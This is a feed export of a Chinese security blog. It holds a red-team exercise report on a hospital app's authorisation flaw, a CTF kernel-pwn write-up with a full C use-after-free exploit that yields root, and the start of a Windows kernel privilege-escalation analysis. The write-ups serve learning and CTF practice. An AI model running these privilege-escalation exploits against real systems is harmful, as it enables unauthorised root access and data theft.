    <content type="html"><![CDATA[<h1>写在前面</h1><p>首先这次的体验就两个字：<strong>坐牢</strong>。先不说会不会能不能打，整个承办体验极差。收手机（为此还前一天收了一部，起了大作用了）。除了收手机以外，还不让用自己的电脑，给的电脑配置很差，空间也就装一个虚拟机。还要梯子，反正就是恶心完了。</p><h1>Web渗透大概记录一下</h1><blockquote><p>“内网渗透的本质是信息搜集”</p></blockquote><p>首先感谢xzj师傅的工具。Web方向的工具也太多了，甚至还有集成好的虚拟机环境，各个GUI做的都牛逼的不行（Yakit），一键扫描一键搜集一键测poc，感叹web吃的也太好了。</p><h2 id="工具">工具</h2><p>最后搞了半天就bp最熟，另一个用的最多的就是轻量化的dudesuite，fofa和重放就够了。信息搜集密探似乎最好用可惜后期才发现。awvs看起来也牛逼但是没用到。</p><h2 id="代理池">代理池</h2><p>第一天没什么进展，中医院的OA指纹识别后测POC发两次就被ban ip，不懂还以为是玩不起，后来问学长和裁判才了解到应该是物理的小盒WAF。不走域名的话测poc被ban一般就要么配代理池要么换目标了。</p><p>代理池又折腾了几天，开始说要一个vps来，要来了也没啥用，CentOS上面什么也没有自己还得配环境，手动编译python装一年装好了还不能用一拖史。整个攻击的网络都是内网，出口ip一样，没有ipv6网段，v4的公网ip自己就不能乱写了。第三天大部分时间在折腾这个，终于放弃了，从网上买新用户白嫖的来发包测poc（到中期都没有能直连访问的了，要么开自己梯子要么代理池）。</p><h2 id="成果">成果</h2><p>第二天从学长了解到上次中医院挖了小程序的越权。这次也试试，主要目标都防护太厉害了。然后学了一手小程序抓包（Proxifier代理有点厉害，进程指定），然后开始人工审计流量（上次也是这么干的）。没想到还真让我审到了，各个接口一个个乱试的时候发现，查地址的时候就算把Token字段全删掉也返回200，测试了一下果然，只认GET里的UserId手机号，token是假的…遂喊人注册验证，果然平行越权随便查。各个接口测一遍下来，只有关联的就诊人这个最敏感的（身份证）有验证，地址和就诊记录都不看Token，太抽象了。<br><img src="/images/hvv/poc1.png" alt="poc1.png"></p><p><img src="/images/hvv/poc2.png" alt="poc2.png"></p><p>交涉3天后拿到1500分，按200w+的数据算了，最后也比武大高，小win</p><p>最后绝大部分还是先弱口令/社工/钓鱼的内网突破，就算没有这些也大部分都是弱口令拿分。我们一个都没找到，发现的都像是蜜罐。</p><h1>anyway</h1><p>不熟悉任何的常见框架，webfuzz，漏洞挖掘，代码审计。人工审小程序硬是拿了1500也算不错了。主要还是不熟悉真实的渗透流程和体系化的那种操作。密探里有一张备忘图就很好。信息搜集该干什么，网站拿到了根据注册框、敏感信息等等我们能做什么攻击测试，有漏洞之后怎么利用最后进入内网等等。前期的准备和信息搜集太少了基本是无头苍蝇，在没用的地方浪费了很多时间。还得是快速找弱口令突破口，另外教程得找同样的护网记录给思路。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;写在前面&lt;/h1&gt;
&lt;p&gt;首先这次的体验就两个字：&lt;strong&gt;坐牢&lt;/strong&gt;。先不说会不会能不能打，整个承办体验极差。收手机（为此还前一天收了一部，起了大作用了）。除了收手机以外，还不让用自己的电脑，给的电脑配置很差，空间也就装一个虚拟机。还要梯子，反正就是恶</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="hvv" scheme="http://example.com/tags/hvv/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门之2015-AliCrackme</title>
    <link href="http://example.com/2024/10/14/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E4%B9%8B2015-AliCrackme/"/>
    <id>http://example.com/2024/10/14/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E4%B9%8B2015-AliCrackme/</id>
    <published>2024-10-14T11:18:51.000Z</published>
    <updated>2024-11-20T06:31:44.034Z</updated>
    
    <content type="html"><![CDATA[<h1>参考实验报告</h1><p>简单的分析，内存dump或者反调试patch。多用dd直接dump内存</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;参考实验报告&lt;/h1&gt;
&lt;p&gt;简单的分析，内存dump或者反调试patch。多用dd直接dump内存&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="Android" scheme="http://example.com/tags/Android/"/>
    
    <category term="逆向" scheme="http://example.com/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Kernel Pwn从入门到入土-2</title>
    <link href="http://example.com/2024/10/11/Kernel-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-2/"/>
    <id>http://example.com/2024/10/11/Kernel-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-2/</id>
    <published>2024-10-11T08:28:17.000Z</published>
    <updated>2024-11-20T07:46:49.673Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><p>init和exit没有什么特殊内容，就是正常的注册和析构。注册了一个名叫<code>babydev</code>的字符设备。</p><p>这道题在bss有一个全局变量，包含了一个buf指针和一个长度字段。下面看看这个驱动在干嘛：</p><h2 id="init-sh-qemu参数：">init.sh-qemu参数：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio </span><br><span class="line">-kernel bzImage </span><br><span class="line">-append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> </span><br><span class="line">-enable-kvm </span><br><span class="line">-monitor /dev/null </span><br><span class="line">-m 64M </span><br><span class="line">--nographic </span><br><span class="line">-smp cores=1,threads=1 </span><br><span class="line">-cpu kvm64,+smep <span class="comment"># 开启了smep</span></span><br></pre></td></tr></table></figure><h2 id="open">open</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);<span class="comment">//</span></span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fentry不用管，是编译的时候gcc在函数入口插入的东西。</p><p>open这个驱动会将buf初始化, 调用<code>kmem_cache_alloc_trace</code>分配一个0x40的object。这个函数也是抽象好几层后的了，我们后面再谈linux内核的内存分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline __alloc_size(<span class="number">3</span>) <span class="type">void</span> *<span class="title function_">kmem_cache_alloc_trace</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">gfp_t</span> flags, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> *ret = kmem_cache_alloc(s, flags);</span><br><span class="line">ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="read和write">read和write</h2><p>没什么差别，直接复制数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ioctl">ioctl</h2><p>ioctl提供了一个调用kmalloc重新分配buf的接口，这里的v4是我们用户态可以控制的参数，也就是说可以重新分配size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command, arg);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3, v3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="release">release</h2><p>对于正常的驱动，release函数会在文件关闭的时候触发。但是这个函数没有在data段开头的file_operations里注册，反而在<code>__mount_loc</code>节中查到了引用，不知道怎么触发的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>release有一个UAF，kfree但全局变量指针不置空。</p><p>总体来看涉及kmalloc和kfree, 可能与内核的堆利用有关。所以下面先介绍一下内核的内存管理机制。</p><blockquote><p>篇幅考虑，相关内容单开了一篇blog，<a href="https://zjw1nd.github.io/2024/10/30/%E9%A1%B5%E8%A1%A8%E4%B9%8B%E4%B8%8A%E2%80%94%E2%80%94Linux%E5%86%85%E6%A0%B8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">点此跳转</a></p></blockquote><h1>UAF</h1><blockquote><p>参考自 <a href="https://www.anquanke.com/post/id/259252#h2-2">在2021年再看ciscn2017 babydriver</a></p></blockquote><h2 id="1-简单粗暴——4-4-72版本uaf必定导致提权">1. 简单粗暴——4.4.72版本uaf必定导致提权</h2><p>如果了解了slab我们就能知道，在kfree后这个object会被放回其原本的list中（比如kmem_cpu_cache的slab列表），并且freelist的第一个也会指向它。也就是说我们能够保证，只要free进去后没有别的操作连续申请相同大小的对象，下一次一定会返回这一个。</p><p>知道了这个我们就有很多的利用方法了。一种比较简单的方法就是把它改成cred的大小然后用户态fork起shell，通过UAF直接改掉euid。这个漏洞在kernel 4.4.72是可用的，显然是因为内核并没有相关的检查——至少这道题的内核没有</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ $ <span class="built_in">whoami</span></span><br><span class="line">ctf</span><br><span class="line">/ $ ./ez_uaf</span><br><span class="line">[*] Start to exploit...</span><br><span class="line">[   11.928864] device open</span><br><span class="line">[   11.929808] device open</span><br><span class="line">[   11.931073] alloc <span class="keyword">done</span></span><br><span class="line">[   11.932012] device release</span><br><span class="line">[+] Successful to get the root. Execve root shell now...</span><br><span class="line">/ <span class="comment"># ls</span></span><br><span class="line">bin          dev          ez_uaf.c     lib          root         sys</span><br><span class="line">boot.sh      etc          home         linuxrc      rootfs.cpio  tmp</span><br><span class="line">bzImage      ez_uaf       init         proc         sbin         usr</span><br><span class="line">/ <span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>); <span class="comment">// cred大小</span></span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Unable to fork the new thread, exploit failed.\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) <span class="comment">// the child thread</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, buf, <span class="number">28</span>); <span class="comment">// UAF </span></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Unable to get the root, exploit failed.\033[0m\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// the parent thread</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);<span class="comment">//waiting for the child</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-更复杂的利用——4-5-版本">2. 更复杂的利用——4.5+版本</h2><p>在这个版本，为cred分配的slab 对象池<code>cred_jar</code>在初始化的时候添加了一个flag位<code>SLAB_ACCOUNT</code>，这导致这样的问题，内核驱动中手动调用的kmalloc虽然大小一样，但是和cred_jar不再共享一个对象池。</p><p>这个时候要引出通用的一个解决方案：劫持tty_struct.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;p&gt;init和exit没有什么特殊内容，就是正常的注册和析构。注册了一个名叫&lt;code&gt;babydev&lt;/code&gt;的字符设备。&lt;/p&gt;
&lt;p&gt;这道题在bss有一个全局变量，包含了一个buf指针和一个长度字段。下面看看这个驱动在干嘛：&lt;/p&gt;
&lt;h2</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="kernel" scheme="http://example.com/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-26229青春版_WindowsKernelPWN</title>
    <link href="http://example.com/2024/10/08/CVE-2024-26229%E9%9D%92%E6%98%A5%E7%89%88-WindowsKernelPWn/"/>
    <id>http://example.com/2024/10/08/CVE-2024-26229%E9%9D%92%E6%98%A5%E7%89%88-WindowsKernelPWn/</id>
    <published>2024-10-08T09:25:07.000Z</published>
    <updated>2024-10-18T05:14:13.151Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考资料：<a href="https://www.youtube.com/watch?v=nauAlHXrkIk">https://www.youtube.com/watch?v=nauAlHXrkIk</a></p></blockquote><h1>怎么提权？——前置知识</h1><h2 id="Windows内核交互">Windows内核交互</h2><p>和LINUX类似，它也有ioctl这种的api，只不过windows内核封装了很多东西，提供了一大坨各种各样功能的api。另外，ntdll这个负责和windows内核通信的模块（可以理解成windows上的glibc）里有很多非公开的函数（是的他们有符号，只是没法用include从头文件引入而已），我们通过<code>GetProcAddress</code>这个接口其实能获取到各种函数的地址。</p><p>虽然有KASLR但其实没用，因为windows有一个接口叫做<code>NtQuerySystemInformation</code>几乎会告诉我们所有内核相关的地址信息…太有feature了。</p><p>其实是用<code>NtQuerySystemInformation</code>可以按参数选定类别查信息，直接就能查到所有进程的handle以及管理他们的eproc结构体地址，PID为4的是一个系统进程，有高权限，而我们当前进程也可以用api查。然后我们的准备工作就完成了。</p><h2 id="Windows进程权限">Windows进程权限</h2><p>在Windows内核提权中，用户态的PEB信息没什么用，重要的是内核中的EPROCESS.每个进程在内核中都有一个EPROCESS结构体进行管理，里面存了UID和一个用于权限鉴别的token，和当前用户挂钩。如果我们能够篡改掉这个token我们的进程就有更高的权限了，类似于<code>commit_creds(prepare_cred(0))</code>这种。但token是这么一个结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EX_FAST_REF</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        VOID* Object;                                                       <span class="comment">//0x0</span></span><br><span class="line">        ULONGLONG RefCnt:<span class="number">4</span>;                                                 <span class="comment">//0x0</span></span><br><span class="line">        ULONGLONG Value;                                                    <span class="comment">//0x0</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>类似于cookie，这个东西自己伪造不太现实，不过我们可以偷。和准备工作中说的一样，我们如果能从系统权限的EPROCESS偷一个高权限token复制进来就好了，这就要求我们有内核地址空间写的权限。</p><h2 id="内核地址空间写入">内核地址空间写入</h2><p>首先有一个好消息，那就是我们Windows也有自己的write：任意虚拟地址写入的API<code>NtWriteVirtualMemory</code>。这个函数会经过<code>ntdll!NtWriteVirtualMemory-&gt;nt!NtWriteVirtualMemory</code>,而最后内核的函数是对<code>MiWriteVirtualMemory</code>的包装。</p><p>但是想写不是那么容易的，通过windbg调试可以知道，如果是用户空间发起的写请求，地址会被windows严格的筛一遍，有三四个检查好像，包括直接和<code>0x7fff..000</code>硬比较，也就是用户地址空间肯定是全ban的。视频截图中可以看到：<br><img src="/images/SnapShot_video.png" alt="Snapshot_video.png"></p><p>那么有没有办法能绕过呢？还是看这个包装后的内部系统调用，它用<code>gs:[188h]</code>取了当前的thread，然后检查了一个叫做PreviousMode的字段。这个字段标识一个线程在发起系统调用请求的时候来自于用户还是内核，1表示用户0表示内核。如果它来自内核，那么写入就不会对地址进行那一大堆检查。因此我们要做的就是想办法在我们当前进程的线程kthread结构体中为previousmode字段写入0，这也是核心漏洞点：<strong>任意地址写0</strong></p><h1>漏洞分析</h1><h2 id="题目驱动分析">题目驱动分析</h2><p>漏洞点在任意地址写0，先以这次的招新赛的青春版驱动为例，ida打开，很简单，观察驱动初始化函数发现除了构建和析构以外还有个疑似ioctl的函数，这个函数在驱动对象结构体的<code>DriverObject-&gt;MajorFunction[14]</code>注册，是<code>IO_DEVICE_CONTROL</code>函数（没错和libc类似也是用宏定义函数功能和注册位置）。不得不说，IDA对windows的支持确实好。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS __fastcall <span class="title function_">init_driver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">  NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line">  NTSTATUS v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">DeviceName</span>;</span> <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line">  _UNICODE_STRING DestinationString; <span class="comment">// [rsp+50h] [rbp-18h] BYREF</span></span><br><span class="line">  PDEVICE_OBJECT DeviceObject; <span class="comment">// [rsp+70h] [rbp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  DeviceName = <span class="number">0LL</span>;</span><br><span class="line">  DestinationString = <span class="number">0LL</span>;</span><br><span class="line">  RtlInitUnicodeString(&amp;DeviceName, <span class="string">L&quot;\\Device\\n0000b&quot;</span>);</span><br><span class="line">  RtlInitUnicodeString(&amp;DestinationString, <span class="string">L&quot;\\DosDevices\\n0000b&quot;</span>);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;Init Driver\r\n&quot;</span>);</span><br><span class="line">  DriverObject-&gt;DriverUnload = (PDRIVER_UNLOAD)delete_module;</span><br><span class="line">  result = IoCreateDevice(DriverObject, <span class="number">0</span>, &amp;DeviceName, <span class="number">0x22</span>u, <span class="number">0x100</span>u, <span class="number">0</span>, &amp;DeviceObject);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    DeviceObject-&gt;Flags |= <span class="number">4u</span>;</span><br><span class="line">    v3 = IoCreateSymbolicLink(&amp;DestinationString, &amp;DeviceName);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      memset64(DriverObject-&gt;MajorFunction, (<span class="type">unsigned</span> __int64)entry, <span class="number">0x1B</span>uLL);</span><br><span class="line">      